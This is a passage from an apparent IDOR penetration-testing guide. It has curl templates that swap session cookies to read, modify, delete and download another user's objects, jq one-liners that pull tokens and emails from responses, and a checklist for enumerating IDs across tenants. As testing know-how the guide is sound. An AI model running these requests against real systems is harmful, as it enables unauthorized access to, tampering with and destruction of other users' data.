```

Requests:

```http
GET /api/invoices/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_B_SESSION
```

```http
GET /api/invoices/1002 HTTP/1.1
Host: target.example
Cookie: session=USER_A_SESSION
```

---

## Practical curl Templates

### GET Object

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

curl -i -sk \
  -H "Cookie: $COOKIE" \
  "$TARGET/api/users/1002"
```

### POST JSON Object ID

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

curl -i -sk \
  -X POST "$TARGET/api/invoice/view" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"invoice_id":1002}'
```

### PATCH Object

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

curl -i -sk \
  -X PATCH "$TARGET/api/users/1002" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"display_name":"changed-by-user-a"}'
```

### DELETE Object

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

curl -i -sk \
  -X DELETE "$TARGET/api/documents/1002" \
  -H "Cookie: $COOKIE"
```

### Download Object

```bash
export TARGET='https://target.example'
export COOKIE='session=USER_A_SESSION'

curl -i -sk \
  -H "Cookie: $COOKIE" \
  "$TARGET/api/files/1002/download" \
  -o downloaded_file.bin
```

---

## jq Helpers

Pretty-print JSON:

```bash
cat response.json | jq
```

Extract IDs:

```bash
cat response.json | jq -r '.. | .id? // empty'
```

Extract user IDs:

```bash
cat response.json | jq -r '.. | .user_id? // empty'
```

Extract emails:

```bash
cat response.json | jq -r '.. | .email? // empty'
```

Extract URLs:

```bash
cat response.json | jq -r '.. | .url? // empty'
```

Extract tokens:

```bash
cat response.json | jq -r '.. | .token? // empty'
```

---

## Response Signals

| Signal                                      | Meaning                      |
| ------------------------------------------- | ---------------------------- |
| HTTP 200 instead of 403                     | Possible unauthorized access |
| HTTP 204 on update/delete                   | Possible state-changing IDOR |
| Same response length as owner               | Strong signal                |
| JSON contains another user's fields         | Confirmed data exposure      |
| File downloads successfully                 | Download IDOR                |
| Redirect to object page                     | Possible access              |
| Email/notification triggered                | Blind IDOR                   |
| Different error for valid vs invalid object | Enumeration oracle           |
| Signed URL generated                        | Signed URL IDOR              |
| Object appears in UI after tamper           | State-change proof           |
| Cross-tenant object loads                   | Multi-tenant breach          |

---

## Evidence Collection

Capture:

```text
User A identity
User B identity
User A owned object ID
User B owned object ID
original User A request
original User B request
tampered request using User A session + User B object
response showing unauthorized access or state change
timestamp
affected endpoint
affected parameter
impact summary
```

Minimal proof examples:

```text
read another user's non-sensitive test object
change display name on second owned test account
download second owned test account's uploaded file
trigger share email to attacker-controlled address
show cross-tenant object metadata
```

Avoid unnecessary bulk extraction during proof.

---

## Testing Checklist

### Discovery

* [ ] Identified all object references in paths.
* [ ] Identified all object references in query parameters.
* [ ] Identified all object references in JSON bodies.
* [ ] Identified all object references in form bodies.
* [ ] Identified all object references in headers.
* [ ] Identified all object references in cookies.
* [ ] Identified all object references in JWT claims.
* [ ] Identified all object references in GraphQL variables.
* [ ] Identified all object references in WebSocket messages.
* [ ] Identified all object references in download/export URLs.

### Account Matrix

* [ ] Created or obtained User A.
* [ ] Created or obtained User B.
* [ ] Captured User A object IDs.
* [ ] Captured User B object IDs.
* [ ] Captured admin or privileged object IDs if in scope.
* [ ] Captured tenant/org/workspace IDs if available.
* [ ] Replayed User A session against User B objects.
* [ ] Replayed User B session against User A objects.
* [ ] Tested unauthenticated access where appropriate.

### Read IDOR

* [ ] Tested profile reads.
* [ ] Tested account reads.
* [ ] Tested invoice/order reads.
* [ ] Tested document/file reads.
* [ ] Tested message/chat reads.
* [ ] Tested notification reads.
* [ ] Tested report/export reads.
* [ ] Tested audit/log reads.
* [ ] Tested API key/token reads.

### Write IDOR

* [ ] Tested profile updates.
* [ ] Tested document updates.
* [ ] Tested ownership updates.
* [ ] Tested assignment updates.
* [ ] Tested role updates.
* [ ] Tested invite/share changes.
* [ ] Tested status changes.
* [ ] Tested approval/rejection actions.
* [ ] Tested destructive actions only when explicitly allowed.

### Enumeration

* [ ] Tested sequential integer IDs.
* [ ] Tested nearby IDs.
* [ ] Tested zero, negative, and boundary IDs.
* [ ] Tested UUID reuse from other accounts.
* [ ] Tested base64-encoded IDs.
* [ ] Tested hex-encoded IDs.
* [ ] Tested hashed predictable IDs.
* [ ] Tested slugs, usernames, and emails.
* [ ] Tested response-length oracles.
* [ ] Tested error-message oracles.

### API-Specific

* [ ] Tested REST path IDs.
* [ ] Tested REST body IDs.
* [ ] Tested nested REST IDs.
* [ ] Tested GraphQL node IDs.
* [ ] Tested GraphQL mutations.
* [ ] Tested batch endpoints.
* [ ] Tested search filters.
* [ ] Tested pagination cursors.
* [ ] Tested export job IDs.
* [ ] Tested signed URL generation.
* [ ] Tested WebSocket object IDs.

### Multi-Tenant

* [ ] Tested tenant IDs.
* [ ] Tested organization IDs.
* [ ] Tested company IDs.
* [ ] Tested workspace IDs.
* [ ] Tested project IDs.
* [ ] Tested cross-tenant users.
* [ ] Tested cross-tenant files.
* [ ] Tested cross-tenant reports.
* [ ] Tested cross-tenant integrations.
* [ ] Tested cross-tenant billing objects.

### Tooling

* [ ] Used Burp Repeater for manual proof.
* [ ] Used Burp Comparer for response differences.
* [ ] Used Burp Intruder for small controlled enumeration.
* [ ] Used Authorize for role/session comparison.
* [ ] Used Auto Repeater for automatic replay.
* [ ] Used ffuf for predictable ID sweeps.
* [ ] Used jq to extract IDs and sensitive fields.
* [ ] Used application logs/UI to confirm blind state changes.

### Evidence

* [ ] Saved original owner request.
* [ ] Saved attacker-session tampered request.
* [ ] Saved unauthorized response.
* [ ] Saved screenshots only when useful.
* [ ] Minimized data exposure.
* [ ] Proved impact with owned test accounts where possible.
* [ ] Documented exact affected endpoint and parameter.
* [ ] Documented whether impact is horizontal, vertical, multi-tenant, read, write, delete, or blind.
